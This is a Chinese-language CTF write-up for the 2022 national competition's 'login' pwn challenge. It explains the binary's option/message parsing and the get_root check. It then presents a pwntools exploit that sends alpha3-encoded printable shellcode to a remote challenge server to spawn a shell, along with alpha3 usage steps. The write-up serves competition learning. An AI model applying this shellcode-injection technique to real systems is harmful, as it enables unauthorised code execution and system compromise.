
# [原创]【ctf2022国赛】login

## 保护

![img](https://bbs.kanxue.com/upload/attach/202205/943085_WMTCER8P3FGSW2Y.jpg)

## ida

### `main`

![img](https://bbs.kanxue.com/upload/attach/202205/943085_2Q6E4XSK2ZCKXNS.jpg)

发现只有一个 `init` 和 `vuln`，然后 `vuln` 能够反复执行，并且每次执行前都传入一个字符串，后续操作基于这个字符串。

### `vuln`

![img](https://bbs.kanxue.com/upload/attach/202205/943085_TWDM2DPENWP58JQ.jpg)

发现里面有一个循环，循环的是什么呢？

![img](https://bbs.kanxue.com/upload/attach/202205/943085_QVQG5DCG8NJAF3R.jpg)

检测了一下 `opt` 和 `msg`，稍加思考是 `option` 和 `message` 两个英文的缩写，也就是“选择”和“信息”。

先看 `option`：

![img](https://bbs.kanxue.com/upload/attach/202205/943085_NTQBQYXU6Y4G7NZ.jpg)

发现 `option` 那里 `atoi()` 的 `v7` 就是这里的选择，那 `message` 呢？

![img](https://bbs.kanxue.com/upload/attach/202205/943085_7R4YN4V5YXS6AW4.jpg)

红色箭头处有一个把消息复制到名为 `dest` 的堆块中的操作，而后面的 `switch` 是对这个 `dest` 进行操作的。

那么我们就可以知道了，`option` 是选择后面的 `switch`，`message` 是指定 `switch` 操作参数的输入（当然 `while` 内部的细节还规定了写 `option` 和 `message` 的格式，这里不赘述，下面贴一下具体格式）：

```python
option:num
message:string
pd = 'optin:num\nmessage:string\n.....' + '\n\n'  # 这个是 python 脚本的写法，最后两个 '\n' 是为了停下 while 循环
```

### `switch`

![img](https://bbs.kanxue.com/upload/attach/202205/943085_BZQBCB9WPJTJAAC.jpg)

看到 `exec`，就很高兴了，因为有一个传 `shellcode` 的接口。

但是别高兴太早，有两个约束：

1. 方框处要求 `shellcode` 必须使用可打印字符。
2. 箭头处有一个暂时不知道是什么的全局变量，要求它必须为 1。

对于（1），我们使用 GitHub 上下载的一个叫 `alpha3` 的轮子，它能够将 `shellcraft` 转为可视化字符（具体用法贴文末）。

对于（2），我们细看 `get_root` 函数：

![img](https://bbs.kanxue.com/upload/attach/202205/943085_EB3NJRXGS2TC5ZK.jpg)

这个函数的功能就是满足 `exec` 中的条件（2），那么我们只需要 `option:1\nmessage:ro0t\n\n` 就行了。

## exp

```python
from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
context.os = 'linux'

def z(r):
    gdb.attach(r)

def exp():
    ## r = process('./login')
    r = remote('101.201.144.12', 41700)
    pd = 'opt:1\nmsg:ro0t"\n\n\n'
    ## z(r)
    r.sendafter(">>> ", pd)
    shellcode = 'Rh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a071N00'
    pd = 'opt:2\nmsg:' + shellcode + '"\n\n\n\n'
    ## z(r)
    r.sendafter(">>> ", pd)
    r.interactive()

if __name__ == '__main__':
    exp()
```

## alpha3用法

`alpha3` 能够把我们的 `asm` 字符转换为全是可打印字符，在 pwn 题中的作用就是来搞 `isprintf()` 约束下的 shellcode。

### 下载

```bash
git clone https://github.com/TaQini/alpha3.git
```

### 整合脚本

```python
# sc.py
from pwn import *
context.arch = 'amd64'
shellcode = shellcraft.sh()
print asm(shellcode)
```

### 使用定向输出到文本

```bash
python sc.py > sc
```

### 使用 alpha3

```bash
python ./alpha3/ALPHA3.py x64 ascii mixedcase rdx --input="sc"
```

![img](https://bbs.kanxue.com/upload/attach/202205/943085_UMAKP86Y68E7Y53.jpg)

注意这里的寄存器是因题而异的，比如这道题：

![img](https://bbs.kanxue.com/upload/attach/202205/943085_8K2BNGZ5QU7B7RN.jpg)

是 `call rdx`，那就是 `rdx`。

### 参考博客

[【CTF题解-0x03】moeCTF2020-partial official write up by arttnba3 | arttnba3's blog](<https://bbs.kanxue.com/elink@508K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6S2M7X3y4Z5K9i4k6W2i4K6u0W2L8X3g2^5N6q4)9J5k6h3q4J5N6s2c8F1j5X3p5K6i4K6u0W2j5$3&6Q4x3V1j5J5x3o6t1H3i4K6u0r3x3o6W2Q4x3V1j5H3y4#2)9J5c8W2!0q4x3#2)9^5x3q4)9&6x3p5y4f1c8W2!0q4z5g2!0m8x3W2)9&6z5q4!0q4z5q4!0m8y4#2!0m8x3#2)9J5k6o6m8^5x3o6y4Q4c8e0y4Q4z5o6m8Q4z5e0q4E0L8$3g2o6g2p5j5J5x3o6t1H3i4K6u0V1N6%4u0A6N6r3g2Q4x3X3c8#2M7q4)9J5k6r3u0&6i4K6u0V1j5i4u0@1N6r3&6T1x3#2)9J5c8R3`.`.`.">)

## 附件

- `login-nomal.zip`（841.57kb，13次下载）
